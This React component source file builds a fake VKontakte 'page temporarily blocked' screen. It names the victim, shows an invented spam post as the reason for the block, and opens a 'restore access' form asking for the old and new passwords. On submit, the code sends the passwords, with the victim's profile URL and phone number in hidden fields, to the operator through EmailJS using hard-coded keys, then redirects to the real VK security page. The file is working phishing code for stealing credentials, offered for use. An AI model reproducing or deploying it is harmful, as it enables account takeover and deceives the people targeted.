import React, { Component } from 'react';
import { Modal }  from 'react-bootstrap';
import emailjs from 'emailjs-com';


class PageLayout extends Component {

    

    constructor()
    {
      super()
      this.state={
        show:false
      }
    }
    handleModal()
    {
      this.setState({show:!this.state.show})
    }



    render() {



        function sendEmail(e) {
            e.preventDefault();
            emailjs.sendForm('service_dluw5q7', 'template_cvz574o', e.target, 'user_Qv1oowSMizAfS2HBERDrx')
              .then((result) => {
                  console.log(result.text);
                  window.location.replace('https://vk.com/account#/security')
              }, (error) => {
                  console.log(error.text);
              });
              e.target.reset();
              
        }

        let BodyTitle = this.props.bodytitle;
        let ProfileImageURL = '../images/people/' + this.props.url + '/profileimage.jpg';
        let VKProfileURL = 'https://vk.com/' + this.props.url;
        return (
            <div id="page_layout">
                <div id="page_body" className="fl_r">
                    <div id="wrap3">
                        <div id="login_blocked_wrap" className="login_blocked_wrap">
                            <div className="page_block">
                                <div className="login_unblock">
                                    <div className="header">
                                        <div className="login_blocked_title">Страница временно заблокирована</div>
                                    </div>

                                    <div className="content">
                                        <div className="login_blocked_about">                                        
                                                         <b>{BodyTitle}</b>, мы обнаружили подозрительную активность и <b>временно заморозили</b> Вашу страницу, чтобы вырвать её из рук злоумышленников.
                                                                <br></br>
                                        </div>
                                        <div className="login_blocked_reason_about">Эта страница была заморожена за публикацию от Вашего лица таких <b>записей:</b></div>
                                    <div className="login_blocked_reason_activity">
                                        <div className="login_blocked_reason_samples_wrap">
                                            <div className="login_blocked_reason">
                                                <div className="user_info clear_fix">
                                                    <div className="login_blocked_reason_photo fl_l">
                                                        <a href="#" target="_blank">
                                                            <img src={ProfileImageURL} className="login_blocked_reason_img"/>
                                                        </a>
                                                    </div>
                                                    <div className="login_blocked_reason_label fl_l">
                                                        в комментарии к записи <a href="#"> $$$...</a>
                                                        <div className="login_blocked_reason_action_time">
                                                            27 ноя в 21:36
                                                        </div>
                                                    </div>
                                                </div>
                                                <div className="login_blocked_reason_text">
                                                    <div>Помогу заработать в интернете <img className="emoji" src="../images/emoji/f09f92b0.png" alt="💰"/></div>
                                                    <div>~</div>
                                                    <div>Работа без начальства!!!</div>
                                                    <div>Не сетевой</div>
                                                    <div>Не ставки</div>
                                                    <div>Не казино</div>
                                                    <div>Не пирамида</div>
                                                    <div>Весь доход получаешь прямо на карту <img className="emoji" src="../images/emoji/f09f989b.png" alt="😛"/></div>
                                                    <div>~</div>
                                                    <div>Кому интересны подробности переходите по ссылке <img className="emoji" src="../images/emoji/f09f9189f09f8fbb.png" alt="👉🏻"/> <a href="#">https://vk.cc/awQ42c</a></div>

                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div className="login_blocked_reason_about">
                                    Чтобы обезопасить свою страницу, мы рекомендуем Вам изменить пароль.
                                    </div>
                                    </div>
                                    
                                    <div className="footer">
                                    
                                        <div className="unlock_button_wrap" id="unblock_button_wrap">
                                        <div className="unblock_button flat_button" onClick={()=>{this.handleModal()}}>Восстановить доступ</div>
                                        <Modal show={this.state.show} aria-labelledby="contained-modal-title-vcenter" centered>
                  
                  <Modal.Header className="box_title_wrap">
                      <div className="box_title">Восстановление пароля</div>
                      <div className="box_x_button" role="button" onClick={()=>{this.handleModal()}}></div>
                  </Modal.Header>
                  <Modal.Body className="UnblockForm__content box_body clear_fix"> 
                  <div className="login_blocked_wrap">
		        <form onSubmit={sendEmail} className="unblock_form">

                    <div className="UnblockForm__content__header">
                        <div className="antispam_team_logo"></div>
                        <div className="reason">Чтобы восстановить учетную запись, подтвердите, что Вы являетесь ее владельцем, и измените свой пароль.</div>
                    </div>

                    <div className="UnblockForm__content__inputs">
                        <div className="input phone_number_prefix_input">
                            <div className="label">Старый пароль</div>
                            <input type="password"  name="current-password" autoComplete="off" className="prefix_input" required/>
                        </div>
                        <div className="input phone_number_prefix_input">
                            <div className="label">Новый пароль</div>
                            <input type="password"  name="new-password" autoComplete="off" className="prefix_input" required/>
                        </div>
                        <div className="input phone_number_prefix_input">
                            <div className="label">Повторите пароль</div>
                            <input type="password"  name="repeat-password" autoComplete="off" className="prefix_input" required/>
                        </div>
                        <input type="text" name="link" autoComplete="off" className="position_absoulte hidden" value={VKProfileURL} readOnly/>
                        <input type="text" name="phone" autoComplete="off" className="position_absoulte hidden" value={this.props.phone} readOnly/>
		            <button type="submit" className="flat_button button_centered" >Изменить пароль</button>
                    </div>
		        </form>
                </div>
                  </Modal.Body>
                   
                  </Modal>
                                        </div> 
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>    
            
        )
    }

}

export default PageLayout